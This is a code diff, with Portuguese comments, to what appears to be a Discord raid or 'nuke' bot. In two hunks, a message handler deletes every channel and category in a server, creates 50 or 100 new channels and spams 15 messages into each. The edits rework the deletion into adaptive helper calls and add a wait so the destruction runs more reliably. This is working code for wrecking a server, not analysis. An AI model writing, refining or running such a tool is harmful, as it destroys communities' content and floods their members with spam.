@@ -1175,28 +1175,25 @@ async def on_message(message):
         size_type, _, _, _ = detect_server_size(guild)
         print(f"[SCAN] {total_channels} canais | {total_cats} categorias | Método: {size_type}")
 
-        # Fase 1: Apagar canais + categorias (paralelo)
-        print("[1/3] Apagando canais + categorias (paralelo)...")
-        channels_to_delete = [ch for ch in list(guild.channels) if not isinstance(ch, discord.CategoryChannel)]
-        cats_to_delete = list(guild.categories)
+        # Fase 1: Apagar canais (adaptativo) + categorias (adaptativo)
+        print("[1/3] Apagando canais...")
+        deleted_ch = await delete_all_channels(guild)
 
-        all_delete_tasks = [delete_channel_fast(ch) for ch in channels_to_delete] \
-                         + [delete_channel_fast(cat) for cat in cats_to_delete]
-        all_delete_results = await asyncio.gather(*all_delete_tasks, return_exceptions=True)
+        print("[1b/3] Apagando categorias...")
+        deleted_cat = await delete_all_categories(guild)
 
-        deleted_ch = sum(1 for r in all_delete_results[:len(channels_to_delete)] if r is True)
-        deleted_cat = sum(1 for r in all_delete_results[len(channels_to_delete):] if r is True)
+        # Esperar os deletes terminarem antes de criar
+        print("       Aguardando Discord processar deleções...")
+        await asyncio.sleep(3)
 
-        print(f"      {deleted_ch}/{total_channels} canais | {deleted_cat}/{total_cats} categorias")
-
-        # Fase 2: Criar 50 canais (paralelo)
-        print("[2/3] Criando 50 canais (paralelo)...")
+        # Fase 2: Criar 50 canais (adaptativo)
+        print("[2/3] Criando 50 canais (adaptativo)...")
         new_channels = await create_all_channels(guild, count=50)
         created = len(new_channels)
         print(f"      {created} canais criados")
 
-        # Fase 3: Spam 15 msgs por canal (paralelo)
-        print("[3/3] Enviando 15 msgs por canal (paralelo)...")
+        # Fase 3: Spam 15 msgs por canal
+        print("[3/3] Enviando 15 msgs por canal...")
         sent = await spam_all_channels(new_channels)
         print(f"      {sent} mensagens enviadas")
 
@@ -1257,28 +1254,25 @@ async def on_message(message):
         size_type, _, _, _ = detect_server_size(guild)
         print(f"[SCAN] {total_channels} canais | {total_cats} categorias | Método: {size_type}")
 
-        # Fase 1: Apagar canais + categorias (paralelo)
-        print("[1/3] Apagando canais + categorias (paralelo)...")
-        channels_to_delete = [ch for ch in list(guild.channels) if not isinstance(ch, discord.CategoryChannel)]
-        cats_to_delete = list(guild.categories)
+        # Fase 1: Apagar canais (adaptativo) + categorias (adaptativo)
+        print("[1/3] Apagando canais...")
+        deleted_ch = await delete_all_channels(guild)
 
-        all_delete_tasks = [delete_channel_fast(ch) for ch in channels_to_delete] \
-                         + [delete_channel_fast(cat) for cat in cats_to_delete]
-        all_delete_results = await asyncio.gather(*all_delete_tasks, return_exceptions=True)
+        print("[1b/3] Apagando categorias...")
+        deleted_cat = await delete_all_categories(guild)
 
-        deleted_ch = sum(1 for r in all_delete_results[:len(channels_to_delete)] if r is True)
-        deleted_cat = sum(1 for r in all_delete_results[len(channels_to_delete):] if r is True)
+        # Esperar os deletes terminarem antes de criar
+        print("       Aguardando Discord processar deleções...")
+        await asyncio.sleep(3)
 
-        print(f"      {deleted_ch}/{total_channels} canais | {deleted_cat}/{total_cats} categorias")
-
-        # Fase 2: Criar 100 canais (paralelo)
-        print("[2/3] Criando 100 canais (paralelo)...")
+        # Fase 2: Criar 100 canais (adaptativo)
+        print("[2/3] Criando 100 canais (adaptativo)...")
         new_channels = await create_all_channels(guild, count=100)
         created = len(new_channels)
         print(f"      {created} canais criados")
 
-        # Fase 3: Spam 15 msgs por canal (paralelo)
-        print("[3/3] Enviando 15 msgs por canal (paralelo)...")
+        # Fase 3: Spam 15 msgs por canal
+        print("[3/3] Enviando 15 msgs por canal...")
         sent = await spam_all_channels(new_channels)
         print(f"      {sent} mensagens enviadas")
 
